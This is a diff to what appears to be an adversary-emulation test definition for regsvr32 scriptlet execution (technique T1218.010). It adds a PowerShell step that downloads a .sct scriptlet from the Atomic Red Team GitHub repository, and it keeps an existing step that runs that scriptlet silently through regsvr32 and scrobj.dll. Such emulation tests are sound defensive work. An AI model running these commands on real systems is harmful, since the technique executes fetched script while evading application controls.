@@ -24,6 +24,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Regsvr32.sct must exist on disk at specified location (#{filename})
+      inline: |
+        if (Test-Path "#{filename}") {exit 0} else {{New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
+        }}
+      executor: powershell
     - name: regsvr32-local-com-scriptlet-execution
       inline: |
         {{.Args.regsvr32path}}\{{.Args.regsvr32name}} /s /u /i:"{{.Args.filename}}" scrobj.dll
